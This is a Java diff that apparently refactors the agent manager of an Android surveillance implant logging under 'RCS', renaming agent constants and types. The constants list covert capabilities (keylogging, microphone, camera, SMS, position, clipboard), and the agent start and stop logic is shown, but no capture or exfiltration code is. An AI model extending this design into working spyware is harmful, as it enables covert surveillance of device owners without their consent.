@@ -77,57 +77,57 @@ public class AgentManager extends Manager {
 		}
 
 		switch (key) {
-		case Agent.AGENT_SMS:
+		case AgentConf.AGENT_SMS:
 			break;
 
-		case Agent.AGENT_TASK:
+		case AgentConf.AGENT_TASK:
 			break;
 
-		case Agent.AGENT_CALLLIST:
+		case AgentConf.AGENT_CALLLIST:
 			break;
 
-		case Agent.AGENT_DEVICE:
+		case AgentConf.AGENT_DEVICE:
 			a = new DeviceAgent();
 			break;
 
-		case Agent.AGENT_POSITION:
+		case AgentConf.AGENT_POSITION:
 			break;
 
-		case Agent.AGENT_CALL:
+		case AgentConf.AGENT_CALL:
 			break;
 
-		case Agent.AGENT_CALL_LOCAL:
+		case AgentConf.AGENT_CALL_LOCAL:
 			break;
 
-		case Agent.AGENT_KEYLOG:
+		case AgentConf.AGENT_KEYLOG:
 			break;
 
-		case Agent.AGENT_SNAPSHOT:
+		case AgentConf.AGENT_SNAPSHOT:
 			a = new SnapshotAgent();
 			break;
 
-		case Agent.AGENT_URL:
+		case AgentConf.AGENT_URL:
 			break;
 
-		case Agent.AGENT_IM:
+		case AgentConf.AGENT_IM:
 			break;
 
-		case Agent.AGENT_EMAIL:
+		case AgentConf.AGENT_EMAIL:
 			break;
 
-		case Agent.AGENT_MIC:
+		case AgentConf.AGENT_MIC:
 			break;
 
-		case Agent.AGENT_CAM:
+		case AgentConf.AGENT_CAM:
 			break;
 
-		case Agent.AGENT_CLIPBOARD:
+		case AgentConf.AGENT_CLIPBOARD:
 			break;
 
-		case Agent.AGENT_CRISIS:
+		case AgentConf.AGENT_CRISIS:
 			break;
 
-		case Agent.AGENT_APPLICATION:
+		case AgentConf.AGENT_APPLICATION:
 			break;
 
 		default:
@@ -147,7 +147,7 @@ public class AgentManager extends Manager {
 	 * @return true, if successful
 	 */
 	public boolean startAgents() {
-		HashMap<Integer, Agent> agents;
+		HashMap<Integer, AgentConf> agents;
 		agents = statusObj.getAgentsMap();
 
 		if (agents == null) {
@@ -175,7 +175,7 @@ public class AgentManager extends Manager {
 	 * Stop agents.
 	 */
 	public void stopAgents() {
-		HashMap<Integer, Agent> agents;
+		HashMap<Integer, AgentConf> agents;
 		agents = statusObj.getAgentsMap();
 		final Iterator<Integer> it = agents.keySet().iterator();
 
@@ -192,7 +192,7 @@ public class AgentManager extends Manager {
 	 *            the key
 	 */
 	public synchronized void startAgent(final int key) {
-		HashMap<Integer, Agent> agents;
+		HashMap<Integer, AgentConf> agents;
 
 		agents = statusObj.getAgentsMap();
 
@@ -213,14 +213,14 @@ public class AgentManager extends Manager {
 		}
 
 		// Agent mapped and running
-		if (a.getStatus() == Agent.AGENT_RUNNING) {
+		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
 			Log.d("RCS", "Agent " + key + " is already running");
 			return;
 		}
 
 		// start() will NEVER be valid again on a stopped thread
 		// so unmap and restart the thread
-		if (a.getStatus() == Agent.AGENT_STOPPED) {
+		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
 			// running.remove(key);
 			a = mapAgent(key);
 		}
